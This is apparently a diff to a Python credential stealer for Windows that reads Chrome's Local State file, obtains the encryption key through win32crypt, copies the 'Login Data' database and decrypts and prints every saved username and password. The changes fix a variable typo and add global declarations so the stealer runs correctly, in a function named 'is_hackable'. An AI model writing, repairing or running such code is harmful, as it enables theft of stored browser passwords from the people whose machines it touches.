@@ -2,14 +2,16 @@
 import os, json, base64, win32crypt, shutil, sqlite3, threading
 from Crypto.Cipher import AES
 
-CHROME_PATH_LOCAL_STATE = None
-CHROME_PATH = None
+CHROME_PATH_LOCAL_STATE = ""
+CHROME_PATH = ""
 
 def is_hackable():
-        OME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+        global CHROME_PATH_LOCAL_STATE, CHROME_PATH
+        
+        CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
         CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
         
-        return os.path.exists(OME_PATH_LOCAL_STATE) and os.path.exists(CHROME_PATH)
+        return os.path.exists(CHROME_PATH_LOCAL_STATE) and os.path.exists(CHROME_PATH)
 
 def get_secret_key():    
     try:
@@ -29,7 +31,7 @@ def get_secret_key():
 
 def fetch_data_from_local_db():
     chrome_path_login_db = CHROME_PATH + r"\Default\Login Data"
-    
+        
     shutil.copy2(chrome_path_login_db, "Loginvault.db") 
     
     #Connect to sqlite database
@@ -88,6 +90,8 @@ def get_and_decrypt_all_passwords():
             print("Username : ", username)
             print("Password : ", decrypted_pass)
             print()
+            
+        print("Finished !")
     else:
         print("You're safe...")
         
